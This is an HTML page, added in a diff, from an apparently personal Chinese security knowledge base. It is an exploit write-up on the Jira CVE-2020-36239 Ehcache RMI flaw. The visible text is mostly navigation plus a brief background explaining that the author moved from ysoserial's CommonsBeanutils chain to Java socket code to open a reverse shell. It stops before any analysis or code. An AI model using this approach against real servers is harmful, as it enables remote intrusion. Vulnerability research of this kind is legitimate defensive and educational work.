@@ -1,0 +1,1498 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>15.Jira_CVE2020-36239_RCE · Aaron 知识库</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        <meta name="author" content="aaron">
+        
+        
+    
+    <link rel="stylesheet" href="../../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-search-plus/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-chapter-fold/chapter-fold.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-splitter/splitter.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-page-treeview/style.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-lightbox/css/lightbox.min.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-donate/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-code/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-tbfed-pagefooter/footer.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-pageview-count/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-ancre-navigation/style/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-anchor-navigation-ex/style/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-insert-logo/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-flexible-alerts/style.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-prism/prism-tomorrow.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="16.fastJson反序列化原理及利用.html" />
+    
+    
+    <link rel="prev" href="14.Tomcat内存马无文件攻击.html" />
+    
+
+    
+        <link rel="shortcut icon" href='../../README.assets/favicon.ico' type="image/x-icon">
+    
+    
+        <link rel="bookmark" href='../../README.assets/favicon.ico' type="image/x-icon">
+    
+    
+        <link rel="apple-touch-icon" href='../../README.assets/favicon.ico'>
+    
+    
+        
+        <link rel="apple-touch-icon" sizes="120x120" href="../../README.assets/favicon.ico">
+        
+        <link rel="apple-touch-icon" sizes="180x180" href="../../README.assets/favicon.ico">
+        
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../../">
+            
+                <a href="../../">
+            
+                    
+                    Introduction
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" >
+            
+                <span>
+            
+                    
+                    01.WEB安全
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" data-path="../01.WEB安全/01.SQLi/">
+            
+                <a href="../01.WEB安全/01.SQLi/">
+            
+                    
+                    01.SQLi
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1.1" data-path="../01.WEB安全/01.SQLi/MSSQL/MSSQL.html">
+            
+                <a href="../01.WEB安全/01.SQLi/MSSQL/MSSQL.html">
+            
+                    
+                    MSSQL
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1.1.1" data-path="../01.WEB安全/01.SQLi/MSSQL/MSSQL常见符号函数符号归类.html">
+            
+                <a href="../01.WEB安全/01.SQLi/MSSQL/MSSQL常见符号函数符号归类.html">
+            
+                    
+                    MSSQL常见符号函数符号归类
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.1.2" data-path="../01.WEB安全/01.SQLi/MSSQL/MSSQL注入基础.html">
+            
+                <a href="../01.WEB安全/01.SQLi/MSSQL/MSSQL注入基础.html">
+            
+                    
+                    MSSQL注入基础
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.1.3" data-path="../01.WEB安全/01.SQLi/MSSQL/常见防御手段及绕过方式.html">
+            
+                <a href="../01.WEB安全/01.SQLi/MSSQL/常见防御手段及绕过方式.html">
+            
+                    
+                    常见防御手段及绕过方式
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.2" data-path="../01.WEB安全/01.SQLi/MYSQL/MYSQL.html">
+            
+                <a href="../01.WEB安全/01.SQLi/MYSQL/MYSQL.html">
+            
+                    
+                    MYSQL
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1.2.1" data-path="../01.WEB安全/01.SQLi/MYSQL/MYSQL常见符号函数语句归类.html">
+            
+                <a href="../01.WEB安全/01.SQLi/MYSQL/MYSQL常见符号函数语句归类.html">
+            
+                    
+                    MYSQL常见符号函数语句归类
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.2.2" data-path="../01.WEB安全/01.SQLi/MYSQL/MySQL注入基础.html">
+            
+                <a href="../01.WEB安全/01.SQLi/MYSQL/MySQL注入基础.html">
+            
+                    
+                    MySQL注入基础
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.3" data-path="../01.WEB安全/01.SQLi/Oracle/Oracle.html">
+            
+                <a href="../01.WEB安全/01.SQLi/Oracle/Oracle.html">
+            
+                    
+                    Oracle
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1.3.1" data-path="../01.WEB安全/01.SQLi/Oracle/Oracle常用符号函数语句归类.html">
+            
+                <a href="../01.WEB安全/01.SQLi/Oracle/Oracle常用符号函数语句归类.html">
+            
+                    
+                    Oracle常用符号函数语句归类
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.3.2" data-path="../01.WEB安全/01.SQLi/Oracle/Oracle注入基础.html">
+            
+                <a href="../01.WEB安全/01.SQLi/Oracle/Oracle注入基础.html">
+            
+                    
+                    Oracle注入基础
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.4" data-path="../01.WEB安全/01.SQLi/Postgresql/Postgresql.html">
+            
+                <a href="../01.WEB安全/01.SQLi/Postgresql/Postgresql.html">
+            
+                    
+                    Postgresql
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1.4.1" data-path="../01.WEB安全/01.SQLi/Postgresql/Postgresql常用符号函数语句归类.html">
+            
+                <a href="../01.WEB安全/01.SQLi/Postgresql/Postgresql常用符号函数语句归类.html">
+            
+                    
+                    Postgresql常用符号函数语句归类
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.4.2" data-path="../01.WEB安全/01.SQLi/Postgresql/Postgresql注入基础.html">
+            
+                <a href="../01.WEB安全/01.SQLi/Postgresql/Postgresql注入基础.html">
+            
+                    
+                    Postgresql注入基础
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.4.3" data-path="../01.WEB安全/01.SQLi/Postgresql/常见防御手段及绕过方式.html">
+            
+                <a href="../01.WEB安全/01.SQLi/Postgresql/常见防御手段及绕过方式.html">
+            
+                    
+                    常见防御手段及绕过方式
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.5" data-path="../01.WEB安全/01.SQLi/SQL注入之伪静态页面布尔注入.html">
+            
+                <a href="../01.WEB安全/01.SQLi/SQL注入之伪静态页面布尔注入.html">
+            
+                    
+                    SQL注入之伪静态页面布尔注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.6" data-path="../01.WEB安全/01.SQLi/ThinkPHP_3.2.3_SQLi.html">
+            
+                <a href="../01.WEB安全/01.SQLi/ThinkPHP_3.2.3_SQLi.html">
+            
+                    
+                    ThinkPHP_3.2.3_SQLi
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2" data-path="../01.WEB安全/02.XSS/">
+            
+                <a href="../01.WEB安全/02.XSS/">
+            
+                    
+                    02.XSS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3" data-path="../01.WEB安全/03.CSRF/">
+            
+                <a href="../01.WEB安全/03.CSRF/">
+            
+                    
+                    03.CSRF
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.3.1" data-path="../01.WEB安全/03.CSRF/CSRF绕过Referer技巧.html">
+            
+                <a href="../01.WEB安全/03.CSRF/CSRF绕过Referer技巧.html">
+            
+                    
+                    CSRF绕过Referer技巧
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4" data-path="../01.WEB安全/04.OS注入/">
+            
+                <a href="../01.WEB安全/04.OS注入/">
+            
+                    
+                    04.OS注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5" >
+            
+                <span>
+            
+                    
+                    05.文件操作
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.5.1" data-path="../01.WEB安全/05.文件操作/文件上传.html">
+            
+                <a href="../01.WEB安全/05.文件操作/文件上传.html">
+            
+                    
+                    文件上传
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.2" data-path="../01.WEB安全/05.文件操作/文件包含.html">
+            
+                <a href="../01.WEB安全/05.文件操作/文件包含.html">
+            
+                    
+                    文件包含
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6" data-path="../01.WEB安全/06.SSRF/">
+            
+                <a href="../01.WEB安全/06.SSRF/">
+            
+                    
+                    06.SSRF
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.6.1" data-path="../01.WEB安全/06.SSRF/SSRF示例（weblogic_SSRF）.html">
+            
+                <a href="../01.WEB安全/06.SSRF/SSRF示例（weblogic_SSRF）.html">
+            
+                    
+                    SSRF示例（weblogic_SSRF）
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6.2" data-path="../01.WEB安全/06.SSRF/SSRF绕过方式.html">
+            
+                <a href="../01.WEB安全/06.SSRF/SSRF绕过方式.html">
+            
+                    
+                    SSRF绕过方式
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.7" data-path="../01.WEB安全/07.XXE/">
+            
+                <a href="../01.WEB安全/07.XXE/">
+            
+                    
+                    07.XXE
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.8" data-path="../01.WEB安全/08.SSTI/">
+            
+                <a href="../01.WEB安全/08.SSTI/">
+            
+                    
+                    08.SSTI
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.9" >
+            
+                <span>
+            
+                    
+                    09.反序列化
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.9.1" data-path="../01.WEB安全/09.反序列化/Java序列化与反序列化.html">
+            
+                <a href="../01.WEB安全/09.反序列化/Java序列化与反序列化.html">
+            
+                    
+                    Java序列化与反序列化
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.9.2" data-path="../01.WEB安全/09.反序列化/PHP反序列化.html">
+            
+                <a href="../01.WEB安全/09.反序列化/PHP反序列化.html">
+            
+                    
+                    PHP反序列化
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.10" >
+            
+                <span>
+            
+                    
+                    10.权限维持
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.10.1" data-path="../01.WEB安全/10.权限维持/Web_权限维持.html">
+            
+                <a href="../01.WEB安全/10.权限维持/Web_权限维持.html">
+            
+                    
+                    Web_权限维持
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.11" >
+            
+                <span>
+            
+                    
+                    11.其他
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.11.1" data-path="../01.WEB安全/11.其他/01.WAF绕过通用思路.html">
+            
+                <a href="../01.WEB安全/11.其他/01.WAF绕过通用思路.html">
+            
+                    
+                    01.WAF绕过通用思路
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.11.2" data-path="../01.WEB安全/11.其他/02.蚁剑RSA加密绕过检测.html">
+            
+                <a href="../01.WEB安全/11.其他/02.蚁剑RSA加密绕过检测.html">
+            
+                    
+                    02.蚁剑RSA加密绕过检测
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.11.3" data-path="../01.WEB安全/11.其他/03.GitHub云扫描器.html">
+            
+                <a href="../01.WEB安全/11.其他/03.GitHub云扫描器.html">
+            
+                    
+                    03.GitHub云扫描器
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.11.4" data-path="../01.WEB安全/11.其他/04.JavaScript原型链污染.html">
+            
+                <a href="../01.WEB安全/11.其他/04.JavaScript原型链污染.html">
+            
+                    
+                    04.JavaScript原型链污染
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.11.5" data-path="../01.WEB安全/11.其他/05.phpfilter协议利用.html">
+            
+                <a href="../01.WEB安全/11.其他/05.phpfilter协议利用.html">
+            
+                    
+                    05.phpfilter协议利用
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.11.6" data-path="../01.WEB安全/11.其他/06.单点登录SSO原理.html">
+            
+                <a href="../01.WEB安全/11.其他/06.单点登录SSO原理.html">
+            
+                    
+                    06.单点登录SSO原理
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.11.7" data-path="../01.WEB安全/11.其他/07.任意用户密码重置的10种姿势.html">
+            
+                <a href="../01.WEB安全/11.其他/07.任意用户密码重置的10种姿势.html">
+            
+                    
+                    07.任意用户密码重置的10种姿势
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.11.8" data-path="../01.WEB安全/11.其他/08.网页接口加密暴破.html">
+            
+                <a href="../01.WEB安全/11.其他/08.网页接口加密暴破.html">
+            
+                    
+                    08.网页接口加密暴破
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" >
+            
+                <span>
+            
+                    
+                    02.JAVA安全
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" data-path="01.Java_JVM内存模型.html">
+            
+                <a href="01.Java_JVM内存模型.html">
+            
+                    
+                    01.Java_JVM内存模型
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2" data-path="02.Java_面向对象.html">
+            
+                <a href="02.Java_面向对象.html">
+            
+                    
+                    02.Java_面向对象
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3" data-path="03.Java反射机制.html">
+            
+                <a href="03.Java反射机制.html">
+            
+                    
+                    03.Java反射机制
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4" data-path="04.Java序列化与反序列化.html">
+            
+                <a href="04.Java序列化与反序列化.html">
+            
+                    
+                    04.Java序列化与反序列化
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.5" data-path="05.RMI基础.html">
+            
+                <a href="05.RMI基础.html">
+            
+                    
+                    05.RMI基础
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.6" data-path="06.JNDI注入原理及利用.html">
+            
+                <a href="06.JNDI注入原理及利用.html">
+            
+                    
+                    06.JNDI注入原理及利用
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.7" data-path="07.OGNL表达式.html">
+            
+                <a href="07.OGNL表达式.html">
+            
+                    
+                    07.OGNL表达式
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.8" data-path="08.EL表达式.html">
+            
+                <a href="08.EL表达式.html">
+            
+                    
+                    08.EL表达式
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.9" data-path="09.SpEL表达式.html">
+            
+                <a href="09.SpEL表达式.html">
+            
+                    
+                    09.SpEL表达式
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.10" data-path="10.Tomcat内存马基础入门.html">
+            
+                <a href="10.Tomcat内存马基础入门.html">
+            
+                    
+                    10.Tomcat内存马基础入门
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.11" data-path="11.Spring框架内存马入门.html">
+            
+                <a href="11.Spring框架内存马入门.html">
+            
+                    
+                    11.Spring框架内存马入门
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.12" data-path="12.Shiro550分析.html">
+            
+                <a href="12.Shiro550分析.html">
+            
+                    
+                    12.Shiro550分析
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.13" data-path="13.Shiro550无文件内存马.html">
+            
+                <a href="13.Shiro550无文件内存马.html">
+            
+                    
+                    13.Shiro550无文件内存马
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.14" data-path="14.Tomcat内存马无文件攻击.html">
+            
+                <a href="14.Tomcat内存马无文件攻击.html">
+            
+                    
+                    14.Tomcat内存马无文件攻击
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.3.15" data-path="15.Jira_CVE2020-36239_RCE.html">
+            
+                <a href="15.Jira_CVE2020-36239_RCE.html">
+            
+                    
+                    15.Jira_CVE2020-36239_RCE
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.16" data-path="16.fastJson反序列化原理及利用.html">
+            
+                <a href="16.fastJson反序列化原理及利用.html">
+            
+                    
+                    16.fastJson反序列化原理及利用
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.17" data-path="17.Spring-Core_RCE.html">
+            
+                <a href="17.Spring-Core_RCE.html">
+            
+                    
+                    17.Spring-Core_RCE
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.18" data-path="18.JNDI注入之com.sun.rowset.JdbcRowSetImpl利用链.html">
+            
+                <a href="18.JNDI注入之com.sun.rowset.JdbcRowSetImpl利用链.html">
+            
+                    
+                    18.JNDI注入之com.sun.rowset.JdbcRowSetImpl利用链
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="../.." >15.Jira_CVE2020-36239_RCE</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div class="search-plus" id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <html><head></head><body><div id="anchor-navigation-ex-navbar"><i class="fa fa-navicon"></i><ul><ul><li><span class="title-icon "></span><a href="#&#x7B80;&#x4ECB;"><b>1.1. </b>&#x7B80;&#x4ECB;</a></li><li><span class="title-icon "></span><a href="#&#x80CC;&#x666F;"><b>1.2. </b>&#x80CC;&#x666F;</a></li><li><span class="title-icon "></span><a href="#&#x6F0F;&#x6D1E;&#x5206;&#x6790;"><b>1.3. </b>&#x6F0F;&#x6D1E;&#x5206;&#x6790;</a></li><ul><li><span class="title-icon "></span><a href="#&#x6F0F;&#x6D1E;&#x89E6;&#x53D1;&#x70B9;"><b>1.3.1. </b>&#x6F0F;&#x6D1E;&#x89E6;&#x53D1;&#x70B9;</a></li></ul><li><span class="title-icon "></span><a href="#&#x6F0F;&#x6D1E;&#x9A8C;&#x8BC1;"><b>1.4. </b>&#x6F0F;&#x6D1E;&#x9A8C;&#x8BC1;</a></li><ul><li><span class="title-icon "></span><a href="#exp"><b>1.4.1. </b>EXP</a></li></ul><li><span class="title-icon "></span><a href="#&#x53C2;&#x8003;&#x94FE;&#x63A5;"><b>1.5. </b>&#x53C2;&#x8003;&#x94FE;&#x63A5;</a></li></ul></ul></div><a href="#" id="anchorNavigationExGoTop"><i class="fa fa-arrow-up"></i></a><div class="treeview__container"><ul>
+<li><div><a href="#&#x7B80;&#x4ECB;">&#x7B80;&#x4ECB;</a><i></i></div></li>
+<li><div><a href="#&#x80CC;&#x666F;">&#x80CC;&#x666F;</a><i></i></div></li>
+<li><div><a href="#&#x6F0F;&#x6D1E;&#x5206;&#x6790;">&#x6F0F;&#x6D1E;&#x5206;&#x6790;</a><i class="level__parent level__item level__parent--opened" state="opened" onclick="var curState = this.getAttribute(&apos;state&apos;);var nextState = curState === &apos;opened&apos; ? &apos;hidden&apos; : &apos;opened&apos;;this.setAttribute(&apos;state&apos;, nextState);this.className = this.className.split(curState).join(nextState);var list = this.parentNode.nextElementSibling;if (nextState === &apos;hidden&apos;) {    list.style.display = &apos;none&apos;;} else {    list.style.display = &apos;block&apos;;}"></i></div>
+<ul>
+<li><div><a href="#&#x6F0F;&#x6D1E;&#x89E6;&#x53D1;&#x70B9;">&#x6F0F;&#x6D1E;&#x89E6;&#x53D1;&#x70B9;</a><i></i></div></li>
+</ul></li>
+<li><div><a href="#&#x6F0F;&#x6D1E;&#x9A8C;&#x8BC1;">&#x6F0F;&#x6D1E;&#x9A8C;&#x8BC1;</a><i class="level__parent level__item level__parent--opened" state="opened" onclick="var curState = this.getAttribute(&apos;state&apos;);var nextState = curState === &apos;opened&apos; ? &apos;hidden&apos; : &apos;opened&apos;;this.setAttribute(&apos;state&apos;, nextState);this.className = this.className.split(curState).join(nextState);var list = this.parentNode.nextElementSibling;if (nextState === &apos;hidden&apos;) {    list.style.display = &apos;none&apos;;} else {    list.style.display = &apos;block&apos;;}"></i></div>
+<ul>
+<li><div><a href="#exp">EXP</a><i></i></div></li>
+</ul></li>
+<li><div><a href="#&#x53C2;&#x8003;&#x94FE;&#x63A5;">&#x53C2;&#x8003;&#x94FE;&#x63A5;</a><i></i></div></li>
+</ul>
+</div>
+
+<h2 id="&#x7B80;&#x4ECB;"><a name="&#x7B80;&#x4ECB;" class="anchor-navigation-ex-anchor" href="#&#x7B80;&#x4ECB;"><i class="fa fa-link" aria-hidden="true"></i></a>1.1. &#x7B80;&#x4ECB;</h2>
+<p>2021 &#x5E74; 7 &#x6708; 9 &#x65E5;&#x4E0A;&#x5348; 5:44 Jira &#x5B98;&#x65B9;&#x53D1;&#x5E03;&#x516C;&#x544A; &#x300A;Jira &#x6570;&#x636E;&#x4E2D;&#x5FC3;&#x548C; Jira &#x670D;&#x52A1;&#x7BA1;&#x7406;&#x6570;&#x636E;&#x4E2D;&#x5FC3; - Ehcache RMI &#x7F3A;&#x5C11;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1; - CVE-2020-36239(<a href="https://jira.atlassian.com/browse/JSDSERVER-8454)&#x300B;" target="_blank">https://jira.atlassian.com/browse/JSDSERVER-8454)&#x300B;</a>, &#x8BE5;&#x6F0F;&#x6D1E;&#x5F71;&#x54CD;&#x591A;&#x4E2A;&#x4EA7;&#x54C1;&#x7684;&#x591A;&#x4E2A;&#x7248;&#x672C;,&#x5B98;&#x65B9;&#x5DF2;&#x7ED9;&#x51FA;&#x4FEE;&#x590D;&#x65B9;&#x6CD5;&#x3002;&#x8BE6;&#x7EC6;&#x8BF7;&#x5173;&#x6CE8; Jira &#x5B98;&#x7F51;&#xFF0C;&#x5C06;&#x8F6F;&#x4EF6;&#x66F4;&#x65B0;&#x81F3;&#x5B89;&#x5168;&#x7248;&#x672C;: <a href="https://jira.atlassian.com/" target="_blank">https://jira.atlassian.com/</a> </p>
+<h2 id="&#x80CC;&#x666F;"><a name="&#x80CC;&#x666F;" class="anchor-navigation-ex-anchor" href="#&#x80CC;&#x666F;"><i class="fa fa-link" aria-hidden="true"></i></a>1.2. &#x80CC;&#x666F;</h2>
+<p>&#x7531;&#x4E8E;&#x5728;&#x590D;&#x73B0;CVE2020-36239&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F7F;&#x7528;ysoserial&#x9879;&#x76EE;&#x4E2D;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x6267;&#x884C;CB1&#xFF0C;&#x65E0;&#x6CD5;&#x6210;&#x529F;&#x5229;&#x7528;&#x53CD;&#x5F39;shell&#xFF0C;&#x6267;&#x884C;&#x4EFB;&#x610F;&#x547D;&#x4EE4;&#xFF0C;&#x5BFC;&#x81F4;&#x4E00;&#x76F4;&#x5728;&#x627E;&#x95EE;&#x9898;&#xFF0C;&#x6700;&#x540E;&#x901A;&#x8FC7;&#x548C;&#x540C;&#x4E8B;&#x6C9F;&#x901A;&#xFF0C;&#x53D1;&#x73B0;&#x8BE5;&#x6F0F;&#x6D1E;&#x5B58;&#x5728;&#x7684;Commons Beanutils &#x786E;&#x5B9E;&#x662F;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#xFF0C;&#x4F46;&#x662F;Commons Collections &#x7248;&#x672C;&#x8F83;&#x9AD8;&#xFF0C;&#x662F;&#x65E0;&#x6CD5;&#x5229;&#x7528;&#x6210;&#x529F;&#x7684;&#xFF1B;&#x4ED4;&#x7EC6;&#x67E5;&#x770B;&#x5176;&#x5B9E;&#x6240;&#x6709;&#x7684;CC&#x94FE;&#xFF0C;CB&#x94FE;&#x5176;&#x5B9E;&#x5C31;&#x662F;&#x4EE3;&#x7801;&#x6267;&#x884C;&#xFF0C;&#x53EA;&#x662F;&#x6267;&#x884C;&#x7684;&#x4EE3;&#x7801;&#x662F;Runtime.getRuntime.exec(cmd)&#xFF0C;&#x5176;&#x4E2D;cmd&#x4E3A;&#x9700;&#x8981;&#x6267;&#x884C;&#x7684;&#x547D;&#x4EE4;&#xFF0C;&#x5728;&#x90E8;&#x7F72;&#x7684;&#x76EE;&#x6807;&#x6D4B;&#x8BD5;&#x73AF;&#x5883;&#xFF0C;&#x901A;&#x8FC7;&#x5B9E;&#x9A8C;&#x6700;&#x540E;&#x5F97;&#x77E5;&#xFF0C;&#x5728;&#x4F7F;&#x7528;Runtime.getRuntime.exec(cmd)&#x662F;&#x65E0;&#x6CD5;&#x6267;&#x884C;&#x547D;&#x4EE4;&#xFF08;&#x53CD;&#x5F39;shell&#xFF09;&#x6700;&#x540E;&#x901A;&#x8FC7;&#x4FEE;&#x6539;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x903B;&#x8F91;&#xFF0C;&#x4F7F;&#x7528;Java&#x7684;socket&#x7F16;&#x7A0B;&#x6765;&#x53CD;&#x5F39;shell&#x3002;</p>
+<h2 id="&#x6F0F;&#x6D1E;&#x5206;&#x6790;"><a name="&#x6F0F;&#x6D1E;&#x5206;&#x6790;" class="anchor-navigation-ex-anchor" href="#&#x6F0F;&#x6D1E;&#x5206;&#x6790;"><i class="fa fa-link" aria-hidden="true"></i></a>1.3. &#x6F0F;&#x6D1E;&#x5206;&#x6790;</h2>
